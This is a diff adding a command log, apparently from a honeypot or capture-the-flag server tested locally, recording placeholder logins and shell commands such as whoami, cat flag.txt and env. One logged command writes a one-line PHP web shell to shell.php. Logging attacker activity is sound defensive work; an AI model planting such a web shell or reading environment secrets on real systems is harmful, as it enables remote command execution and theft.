@@ -1,0 +1,18 @@
+Client 127.0.0.1 attempted connection with username: username, password: password
+Client 127.0.0.1 attempted connection with username: username, password: password
+[2025-04-25 09:38:16] [127.0.0.1] [USERNAME: ] [CMD] ls
+[2025-04-25 09:38:21] [127.0.0.1] [USERNAME: ] [CMD] cat flag.txt
+Client 127.0.0.1 attempted connection with username: username, password: password
+[2025-04-25 09:39:33] [127.0.0.1] [USERNAME: ] [CMD] whoami
+[2025-04-25 09:39:44] [127.0.0.1] [USERNAME: ] [CMD] ls
+[2025-04-25 09:39:46] [127.0.0.1] [USERNAME: ] [CMD] pwd
+Client 127.0.0.1 attempted connection with username: username, password: password
+[2025-04-25 10:11:03] [127.0.0.1] [USERNAME: username] [CMD] ls
+[2025-04-25 10:11:13] [127.0.0.1] [USERNAME: username] [CMD] nano
+[2025-04-25 10:11:24] [127.0.0.1] [USERNAME: username] [CMD] nano test.txt
+[2025-04-25 10:11:32] [127.0.0.1] [USERNAME: username] [CMD] echo hello
+[2025-04-25 10:11:48] [127.0.0.1] [USERNAME: username] [CMD] history
+[2025-04-25 10:12:40] [127.0.0.1] [USERNAME: username] [CMD] echo "<?php system(\$_GET[\'cmd\']); ?>" > shell.php
+[2025-04-25 10:12:42] [127.0.0.1] [USERNAME: username] [CMD] ls
+[2025-04-25 10:12:46] [127.0.0.1] [USERNAME: username] [CMD] cat flag.txt
+[2025-04-25 10:12:58] [127.0.0.1] [USERNAME: username] [CMD] env
